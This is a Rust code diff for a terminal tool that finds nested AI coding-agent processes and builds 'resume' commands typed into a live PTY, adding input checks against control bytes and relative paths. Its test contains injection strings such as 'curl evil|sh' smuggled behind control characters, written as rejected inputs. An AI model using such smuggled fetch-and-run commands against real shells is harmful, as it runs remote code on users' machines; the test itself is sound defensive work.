@@ -181,6 +181,32 @@ fn file_name(tok: &str) -> String {
 /// may sit under `tmux`, a `sudo`, or a nested shell. When several match (an
 /// agent that shelled out to another agent) the OLDEST wins — that is the one
 /// the user launched and the one whose conversation the terminal is really in.
+/// Whether `pid` has at least one child process — one cheap syscall, so the
+/// nested-agent sweep can skip its whole-machine `ps` while every live shell
+/// just sits at a prompt (S9-10). Errs on `true` (scan) when unsure.
+#[cfg(target_os = "macos")]
+pub fn has_children(pid: u32) -> bool {
+    let Ok(pid) = libc::pid_t::try_from(pid) else {
+        return true;
+    };
+    let mut buf = [0 as libc::pid_t; 16];
+    // SAFETY: the buffer is valid for `size_of_val(&buf)` bytes and outlives
+    // the call; the kernel writes at most that many bytes.
+    let n = unsafe {
+        libc::proc_listchildpids(
+            pid,
+            buf.as_mut_ptr().cast(),
+            std::mem::size_of_val(&buf) as libc::c_int,
+        )
+    };
+    n != 0
+}
+/// Non-macOS: no cheap probe here — always scan.
+#[cfg(not(target_os = "macos"))]
+pub fn has_children(_pid: u32) -> bool {
+    true
+}
+
 pub fn find_nested_agent(root: u32, table: &[ProcInfo]) -> Option<(ProcInfo, &'static str)> {
     use std::collections::HashMap;
     let mut children: HashMap<u32, Vec<usize>> = HashMap::new();
@@ -302,7 +328,16 @@ pub fn claude_transcript_in_window(
 /// Otto's unattended-mode flags: the user launched this CLI by hand in a plain
 /// shell, so we hand back exactly the conversation and nothing else — their own
 /// permission mode, their own defaults.
+///
+/// The line is TYPED into a live PTY, where the line discipline and the
+/// shell's editor act on control bytes (^C, ^U, ^J…) before any quoting
+/// applies — so a value carrying one, or a launch dir that isn't absolute,
+/// yields no command at all.
 pub fn resume_command(provider: &str, sid: &str, from_cwd: Option<&str>) -> Option<String> {
+    let typeable = |v: &str| !v.is_empty() && !v.chars().any(char::is_control);
+    if !typeable(sid) || from_cwd.is_some_and(|d| !typeable(d) || !d.starts_with('/')) {
+        return None;
+    }
     let resume = match provider {
         "claude" => format!("claude --resume {}", shell_quote(sid)),
         "codex" => format!("codex resume {}", shell_quote(sid)),
@@ -325,7 +360,37 @@ pub fn shell_quote(s: &str) -> String {
 
 #[cfg(test)]
 mod tests {
+    #[cfg(target_os = "macos")]
+    #[test]
+    #[allow(clippy::disallowed_methods)] // test: spawning a real child is the point
+    fn has_children_sees_a_live_child_and_not_a_leaf() {
+        let mut child = std::process::Command::new("/bin/sleep")
+            .arg("5")
+            .spawn()
+            .expect("spawn sleep");
+        assert!(super::has_children(std::process::id()));
+        assert!(!super::has_children(child.id()), "sleep has no children");
+        let _ = child.kill();
+        let _ = child.wait();
+    }
+
     use super::*;
+
+    /// S1-12: control bytes act in the PTY before quoting does; a relative
+    /// launch dir is refused too.
+    #[test]
+    fn resume_command_refuses_control_bytes_and_relative_dirs() {
+        assert_eq!(
+            resume_command("claude", "abc", Some("/p/it's")).as_deref(),
+            Some("cd '/p/it'\\''s' && claude --resume 'abc'")
+        );
+        assert!(resume_command("claude", "abc", Some("x\u{3}curl evil|sh #")).is_none());
+        assert!(resume_command("claude", "abc", Some("/p\ncurl evil|sh")).is_none());
+        assert!(resume_command("claude", "a\u{15}b", None).is_none());
+        assert!(resume_command("claude", "abc", Some("relative/dir")).is_none());
+        assert!(resume_command("claude", "", None).is_none());
+        assert!(resume_command("claude", "abc", None).is_some());
+    }
 
     #[test]
     fn etime_parses_every_ps_shape() {
